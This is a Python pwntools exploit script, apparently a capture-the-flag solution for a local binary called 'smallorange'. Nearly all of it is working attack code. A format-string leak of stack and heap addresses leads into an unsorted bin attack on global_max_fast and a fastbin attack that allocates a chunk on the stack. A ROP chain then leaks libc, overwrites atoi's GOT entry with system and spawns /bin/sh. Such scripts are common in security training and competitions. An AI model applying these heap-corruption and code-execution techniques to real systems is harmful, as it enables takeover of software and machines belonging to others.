from pwn import *

context.log_level = 'debug'

p = process(argv=['./smallorange','a'*0x1000])
#p = process('./smallorange',env={'123'*0x1000:'a'*0x1000})

def new(data):
	p.recvuntil('choice: ')
	p.sendline('1')
	p.recvuntil('text:\n')
	p.send(data)

def out(index):
	p.recvuntil('choice: ')
	p.sendline('2')
	p.recvuntil('index:\n')
	p.sendline(str(index))

#use fmt change size to heapoverflow and leak stack_addr
p.recvuntil('ourselves\n')
p.send('a'*34 + 'a%19$n')
p.recvuntil('a'*35)
leak_stack = u64(p.recv(6).ljust(8,'\x00'))
p.recvuntil('addr:')
leak_heap = int(p.recvuntil('\n',drop=True),16)
log.success('leak stack addr : 0x%x'%leak_stack)
log.success('leak heap addr : 0x%x'%leak_heap)

#unsorted bin attack to hijack global_max_fast
new('aaaa') #0
new('bbbb') #1
new('cccc') #2
new('1') #3
new('2') #4
new('3') #5
out(0)
out(1)
fake_unsorted_bin = 'a'*0x100 + p64(0x110) + p64(0x111)
fake_unsorted_bin += 'a'*0x8 + '\xe8\x37'
new(fake_unsorted_bin) #6
new('dddd') #7

#fastbin attack to alloc to Stack
fake_chunk_ptr = leak_stack - 89 - 0x8
log.success('fake_chunk_ptr : 0x%x'%fake_chunk_ptr)
out(4)
out(3)
payload = 'a'*0x100 + p64(0) + p64(0x111)
payload += p64(fake_chunk_ptr)
new(payload)
new('eeee')
#fake chunk on stack
out(p64(0x111))
#rop 
elf = ELF('./smallorange')
write_got = elf.got['write']
puts_got = elf.got['puts']
read_got = elf.got['read']
atoi_got = elf.got['atoi']
p6_ret = 0x400C9A
mov_call = 0x400C80
payload = 'p'*0x10 + p64(p6_ret)
payload += p64(0) + p64(1) + p64(write_got) + p64(0x8) + p64(puts_got) + p64(1)
payload += p64(mov_call) + 'aaaaaaaa'
payload += p64(0) + p64(1) + p64(read_got) + p64(0x8) + p64(atoi_got) + p64(0)
payload += p64(mov_call) + 'a'*56 + p64(0x400AEA)
new(payload)

#leak libc
puts_addr = u64(p.recv(8))
log.success('puts addr : 0x%x'%puts_addr)
offset_puts = 0x000000000006f690
offset_system = 0x0000000000045390
libc_base = puts_addr - offset_puts
system_addr = libc_base + offset_system
log.success('system addr : 0x%x'%system_addr)

#system('/bin/sh\x00')
p.send(p64(system_addr))
p.recvuntil('index:\n')
p.sendline('/bin/sh\x00')


p.interactive()